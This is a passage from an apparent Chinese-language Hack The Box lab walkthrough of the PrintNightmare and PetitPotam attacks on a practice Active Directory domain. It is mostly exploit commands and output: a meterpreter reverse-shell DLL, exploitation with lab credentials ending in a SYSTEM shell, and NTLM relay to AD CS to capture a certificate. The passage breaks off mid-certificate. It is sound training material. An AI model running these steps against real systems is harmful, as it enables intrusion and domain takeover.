<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ git <span class="built_in">clone</span> https://github.com/cube0x0/CVE-2021-1675.git</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 uninstall impacket</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/cube0x0/impacket</span><br><span class="line"><span class="built_in">cd</span> impacket</span><br><span class="line">python3 ./setup.py install</span><br></pre></td></tr></table></figure>

<h4 id="枚举-MS-RPRN"><a href="#枚举-MS-RPRN" class="headerlink" title="枚举 MS-RPRN"></a>枚举 MS-RPRN</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep <span class="string">&#x27;MS-RPRN|MS-PAR&#x27;</span></span><br><span class="line"></span><br><span class="line">Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol </span><br><span class="line">Protocol: [MS-RPRN]: Print System Remote Protocol </span><br></pre></td></tr></table></figure>

<h4 id="生成-DLL-载荷-使用-smbserver-py-创建共享"><a href="#生成-DLL-载荷-使用-smbserver-py-创建共享" class="headerlink" title="生成 DLL 载荷&#x2F;使用 smbserver.py 创建共享"></a>生成 DLL 载荷&#x2F;使用 smbserver.py 创建共享</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 8704 bytes</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="built_in">set</span> LHOST 172.16.5.225</span><br><span class="line">LHOST =&gt; 10.3.88.114</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; <span class="built_in">set</span> LPORT 8080</span><br><span class="line">LPORT =&gt; 8080</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.16.5.225:8080 </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 <span class="string">&#x27;\\172.16.5.225\CompData\backupscript.dll&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL</span><br><span class="line">[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll</span><br><span class="line">[*] Try 1...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 2...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 3...</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending stage (200262 bytes) to 172.16.5.5</span><br><span class="line">[*] Meterpreter session 1 opened (172.16.5.225:8080 -&gt; 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Windows\system32) &gt; shell</span><br><span class="line">Process 5912 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.737]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<h2 id="PetitPotam-MS-EFSRPC"><a href="#PetitPotam-MS-EFSRPC" class="headerlink" title="PetitPotam (MS-EFSRPC)"></a>PetitPotam (MS-EFSRPC)</h2><p>PetitPotam（CVE-2021-36942）是一个 LSA 欺骗漏洞，已于 2021 年 8 月得到修补。该漏洞允许未经身份验证的攻击者通过滥用微软的加密文件系统远程协议（MS-EFSRPC），利用本地安全机构远程协议（LSARPC）强制域控制器使用 NTLM 通过端口 445 向另一主机进行身份验证。此技术使得未经身份验证的攻击者能够在使用 Active Directory 证书服务（AD CS）的 Windows 域中接管控制权。在攻击过程中，来自目标域控制器的身份验证请求被中继到证书颁发机构（CA）主机的 Web 注册页面，并生成一个新的数字证书的证书签名请求（CSR）。然后，可以使用 PKINITtools 中的 <code>Rubeus</code> 或 <code>gettgtpkinit.py</code> 等工具，利用此证书为域控制器请求 TGT，进而通过 DCSync 攻击实现域的攻陷。</p>
<h4 id="启动-ntlmrelayx-py"><a href="#启动-ntlmrelayx-py" class="headerlink" title="启动 ntlmrelayx.py"></a>启动 ntlmrelayx.py</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - </span><br><span class="line"></span><br><span class="line">Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Setting up WCF Server</span><br></pre></td></tr></table></figure>

<h4 id="运行-PetitPotam-py"><a href="#运行-PetitPotam-py" class="headerlink" title="运行 PetitPotam.py"></a>运行 PetitPotam.py</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       </span><br><span class="line">                                                                                 </span><br><span class="line">              ___            _        _      _        ___            _                     </span><br><span class="line">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   </span><br><span class="line">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | <span class="string">&#x27;  \  </span></span><br><span class="line"><span class="string">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span></span><br><span class="line"><span class="string">          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span></span><br><span class="line"><span class="string">          &quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span> </span><br><span class="line">                                         </span><br><span class="line">              PoC to elicit machine account authentication via some MS-EFSRPC <span class="built_in">functions</span></span><br><span class="line">                                      by topotam (@topotam77)</span><br><span class="line">      </span><br><span class="line">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span><br><span class="line"></span><br><span class="line">Trying pipe lsarpc</span><br><span class="line">[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line"></span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br></pre></td></tr></table></figure>

<h4 id="捕获用于-DC01-的-Base64-编码证书"><a href="#捕获用于-DC01-的-Base64-编码证书" class="headerlink" title="捕获用于 DC01 的 Base64 编码证书"></a>捕获用于 DC01 的 Base64 编码证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Setting up WCF Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01<span class="variable">$@172</span>.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] HTTP server returned error code 200, treating as a successful login</span><br><span class="line">[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED</span><br><span class="line">[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01<span class="variable">$@172</span>.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] HTTP server returned error code 200, treating as a successful login</span><br><span class="line">[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED</span><br><span class="line">[*] Generating CSR...</span><br><span class="line">[*] CSR generated!</span><br><span class="line">[*] Getting certificate...</span><br><span class="line">[*] GOT CERTIFICATE!</span><br><span class="line">[*] Base64 certificate of user ACADEMY-EA-DC01$: </span><br><span class="line">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